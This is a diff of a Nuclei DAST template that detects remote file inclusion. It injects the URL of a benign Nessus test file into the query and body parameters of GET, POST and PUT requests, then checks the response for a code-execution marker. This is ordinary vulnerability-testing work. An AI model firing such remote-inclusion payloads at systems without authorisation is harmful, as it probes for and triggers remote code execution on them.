@@ -1,5 +1,4 @@
 id: generic-rfi
-
 info:
   name: Generic Remote File Inclusion
   author: m4lwhere
@@ -8,28 +7,28 @@ info:
     - https://www.invicti.com/learn/remote-file-inclusion-rfi/
   metadata:
     max-request: 1
-  tags: rfi,dast,oast,vuln
-
+  tags: dast,oast,rfi,vuln
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
-
+  - fuzzing:
+      - fuzz:
+          - '{{rfi}}'
+        mode: single
+        parts:
+          - query
+          - body
+    matchers:
+      - part: body # Confirms the PHP was executed
+        type: word
+        words:
+          - NessusCodeExecTest
+          # digest: 4a0a00473045022100d03b34ddb92c7cc852ec8d999015824213a2fe89bc2e0951c49aeae8096dd7bf0220469acd53bb9cb2b76df527e98b29ec1ab9266612c0832a928b8aa1b367c52388:922c64590222798bb761d5b6d8e72950
     payloads:
       rfi:
-        - "https://rfi.nessus.org/rfi.txt"
-
-    fuzzing:
-      - part: query
-        mode: single
-        fuzz:
-          - "{{rfi}}"
-
+        - https://rfi.nessus.org/rfi.txt
+    pre-condition:
+      - dsl:
+          - method == "GET"
+          - method == "POST"
+          - method == "PUT"
+        type: dsl
     stop-at-first-match: true
-    matchers:
-      - type: word
-        part: body  # Confirms the PHP was executed
-        words:
-          - "NessusCodeExecTest"
-
